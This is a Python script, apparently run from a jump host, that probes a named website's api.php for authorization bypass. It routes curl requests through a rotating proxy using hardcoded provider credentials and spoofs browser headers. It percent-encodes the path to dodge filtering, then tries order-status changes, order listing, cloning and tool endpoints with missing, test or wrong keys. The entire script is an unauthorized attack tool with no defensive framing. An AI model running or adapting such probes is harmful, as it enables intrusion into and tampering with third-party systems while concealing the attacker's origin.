#!/usr/bin/env python3
"""Quick auth map via China jump + QG — run ON jump host."""
import json, subprocess, urllib.parse, time

raw = subprocess.check_output(
    ["curl", "-s", "https://share.proxy.qg.net/get?key=C413ED6D&num=1"], text=True
)
d = json.loads(raw)
px = "http://C413ED6D:344F550A6F8B@" + d["data"][0]["server"]
print("proxy", d["data"][0]["server"])


def c(url, post=None):
    cmd = [
        "curl", "-sk", "--max-time", "15", "-x", px, "-A", "Mozilla/5.0",
        "-H", "Referer: https://qq1.lol/",
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-w", "\nHTTP:%{http_code}",
    ]
    if post is not None:
        body = urllib.parse.urlencode(post) if isinstance(post, dict) else post
        cmd += ["-X", "POST", "-d", body]
    cmd.append(url)
    out = subprocess.run(cmd, capture_output=True, text=True, timeout=20).stdout
    body, code = out.rsplit("HTTP:", 1)
    return body.strip(), code.strip()


tests = [
    ("GET id+zt=1 no key", "https://qq1.lol/%61pi.php?act=change&id=25949&zt=1", None),
    ("GET id+zt=1 POST key=test", "https://qq1.lol/%61pi.php?act=change&id=25949&zt=1", {"key": "test"}),
    ("GET id+zt=1 POST key=wrong", "https://qq1.lol/%61pi.php?act=change&id=25949&zt=1", {"key": "wrong_long_key_999"}),
    ("GET id+zt=2 POST key=test", "https://qq1.lol/%61pi.php?act=change&id=25949&zt=2", {"key": "test"}),
    ("GET id+zt=3 POST key=test", "https://qq1.lol/%61pi.php?act=change&id=25949&zt=3", {"key": "test"}),
    ("GET id+zt=4 POST key=test", "https://qq1.lol/%61pi.php?act=change&id=25949&zt=4", {"key": "test"}),
    ("POST orders key=test", "https://qq1.lol/%61pi.php?act=orders", {"key": "test", "limit": "1", "tid": "102"}),
    ("POST search key=test", "https://qq1.lol/%61pi.php?act=search", {"id": "25949", "key": "test"}),
    ("GET tools", "https://qq1.lol/%61pi.php?act=tools&key=test&limit=1", None),
    ("GET clone", "https://qq1.lol/%61pi.php?act=clone&key=test", None),
    ("GET siteinfo", "https://qq1.lol/%61pi.php?act=siteinfo", None),
    ("GET goodslistbycid", "https://qq1.lol/%61pi.php?act=goodslist", None),
    ("POST goodslist", "https://qq1.lol/%61pi.php?act=goodslist", {}),
    ("POST goodsdetails", "https://qq1.lol/%61pi.php?act=goodsdetails", {"tid": "102"}),
]

for name, url, post in tests:
    b, code = c(url, post)
    print(f"{name}: HTTP={code} {b[:200]}")
    time.sleep(0.3)
